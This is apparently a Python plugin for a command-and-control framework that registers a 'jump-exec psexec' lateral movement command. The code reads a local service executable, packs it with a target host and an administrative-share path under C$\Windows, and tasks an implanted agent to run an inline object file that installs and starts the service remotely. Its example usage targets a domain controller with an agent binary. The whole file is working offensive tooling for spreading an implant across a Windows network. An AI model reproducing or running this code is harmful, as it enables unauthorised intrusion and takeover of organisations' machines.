from vaelix_host import Agent, RegisterCommand, RegisterModule
from os.path import exists

def psexec( agentID, *param ):
    TaskID : str    = None
    agent  : Agent  = None
    packer : Packer = Packer()

    Host      : str   = ""
    SvcName   : str   = ""
    SvcPath   : str   = ""
    SvcBinary : bytes = b''

    agent = Agent( agentID )

    if len(param) < 3:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough arguments" )
        return False

    if len(param) > 3:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many arguments" )
        return False

    Host    = param[ 0 ]
    SvcName = param[ 1 ]
    SvcPath = param[ 2 ]

    if exists( SvcPath ) is False:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Service executable not found: {SvcPath}" )
        return False
    else:
        SvcBinary = open( SvcPath, 'rb' ).read()
        if len(SvcBinary) == 0:
            agent.ConsoleWrite( agent.CONSOLE_ERROR, "Specified service executable is empty" )
            return False

    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute {SvcPath} on {Host} using psexec" )

    packer.addstr( Host )
    packer.addstr( SvcName )
    packer.addstr( SvcBinary )
    packer.addstr( "\\\\" + Host + "\\C$\\Windows\\" + SvcName + ".exe" )

    agent.InlineExecute( TaskID, "go", f"psexec.{agent.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

RegisterModule( "jump-exec", "lateral movement module", "", "[exploit] (args)", "", ""  )
RegisterCommand( psexec, "jump-exec", "psexec", "executes specified service on target host ", 0, "[Host] [Service Name] [Local Path]", "DOMAIN-DC AgentSvc /tmp/MyAgentSvc.exe" )
